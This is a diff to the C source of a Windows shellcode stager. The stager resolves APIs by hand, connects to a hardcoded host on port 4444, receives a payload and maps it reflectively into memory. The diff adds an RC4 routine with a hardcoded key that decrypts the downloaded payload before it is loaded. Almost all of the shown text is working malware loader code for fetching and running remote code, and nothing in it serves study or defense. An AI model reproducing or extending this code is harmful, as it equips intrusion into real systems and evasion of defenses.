@@ -23,31 +23,56 @@ typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
 #define RAW_IP   0x7F000001     // 127.0.0.1
 #define RAW_PORT 4444           // Port 4444
 
+static void rc4_decrypt(const unsigned char *key, int key_len, char *rawBuf, unsigned int payload_size)
+{
+    unsigned char S[256];
+    for (int i = 0; i < 256; i++)
+        S[i] = (unsigned char)i;
+
+    int j = 0;
+    for (int i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % key_len]) % 256;
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+    }
+
+    int i = 0;
+    j = 0;
+    for (unsigned int n = 0; n < payload_size; n++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        
+        unsigned char temp = S[i];
+        S[i] = S[j];
+        S[j] = temp;
+
+        rawBuf[n] ^= (char)S[(S[i] + S[j]) % 256];
+    }
+}
+
 extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
     ULONG_PTR kernel32 = GetKernel32Base();
     if (!kernel32)
         return;
 
     // Resolve Essential Kernel32 APIs
-    char strLoadLibrary[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 }; // LoadLibraryA()
-    char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 }; // VirtualAlloc()
+    char strLoadLibrary[]  = "LoadLibraryA";
+    char strVirtualAlloc[] = "VirtualAlloc";
+    char strWs2[]          = "ws2_32.dll";
+    char strWSAStartup[]   = "WSAStartup";
+    char strWSASocketA[]   = "WSASocketA";
+    char strConnect[]      = "connect";
+    char strRecv[]         = "recv";
     
     fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(kernel32, strLoadLibrary);
     fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)CustomGetProcAddress(kernel32, strVirtualAlloc);
     if (!pLoadLibraryA || !pVirtualAlloc)
         return;
 
-    // Load Winsock
-    char strWs2[] = { 'w','s','2','_','3','2','.','d','l','l', 0 }; // ws2_32.dll
     HMODULE hWs2 = pLoadLibraryA(strWs2);
     if (!hWs2)
         return;
-
-    // Resolve Winsock APIs
-    char strWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p', 0 }; // WSAStartup()
-    char strWSASocketA[] = { 'W','S','A','S','o','c','k','e','t','A', 0 }; // WSASocketA()
-    char strConnect[] = { 'c','o','n','n','e','c','t', 0 }; // connect()
-    char strRecv[] = { 'r','e','c','v', 0 }; // recv()
 
     fnWSAStartup pWSAStartup = (fnWSAStartup)CustomGetProcAddress((ULONG_PTR)hWs2, strWSAStartup);
     fnWSASocketA pWSASocketA = (fnWSASocketA)CustomGetProcAddress((ULONG_PTR)hWs2, strWSASocketA);
@@ -99,6 +124,11 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
 
         totalReceived += chunk;
     }
+
+    char rc4Key[] = "RC4";
+    int rc4KeyLen = sizeof(rc4Key) - 1;
+
+    rc4_decrypt((unsigned char *)rc4Key, rc4KeyLen, rawBuf, payloadSize);
 
     // Reflective PE Header Verification & Space Mapping Phase
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)rawBuf;
